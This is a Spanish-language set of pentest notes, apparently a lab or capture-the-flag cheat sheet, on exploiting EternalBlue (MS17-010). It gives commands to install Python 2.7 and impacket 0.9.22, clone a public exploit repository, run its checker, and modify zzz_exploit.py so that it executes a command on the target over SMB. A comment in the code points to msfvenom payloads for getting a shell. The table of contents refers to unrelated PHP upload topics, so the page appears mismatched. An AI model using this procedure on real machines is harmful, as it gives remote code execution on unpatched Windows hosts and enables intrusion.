# EternalBlue

> para explotar el eternalblue necesito hacerlo con python2.7, y usa herramientas de impacket.

## Summary

* [Php](#php)
	* [Subida de archivo](#subida-de-archivos)
	* [Content Type](#content-type)
	* [Magic Number](#magic-number)

## Install python2.7

sudo apt-get install python2.7

## install pip2.7

wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
sudo python2.7 get-pip.py

- pip2.7 install impacket 
	+ esta opción nos pone problemas
- pip2.7 install impacket==0.9.22
	+ esta es la solución

## clonar el repositorio

git clone https://github.com/worawit/MS17-010.git

y listo podemos ejecutar el binario

python2.7 checker.py

y modificamos el script `zzz_exploit.py`

```python
def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()
    
    #print('creating file c:\\pwned.txt on the target')
    #tid2 = smbConn.connectTree('C$')
    #fid2 = smbConn.createFile(tid2, '/pwned.txt')
    #smbConn.closeFile(tid2, fid2)
    #smbConn.disconnectTree(tid2)
    
    #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
    service_exec(conn, r'cmd /c ping 10.10.14.2')
    # Note: there are many methods to get shell over SMB admin session
    # a simple method to get shell (but easily to be detected by AV) is
    # executing binary generated by "msfvenom -f exe-service ..."

```
{: .nolineno}
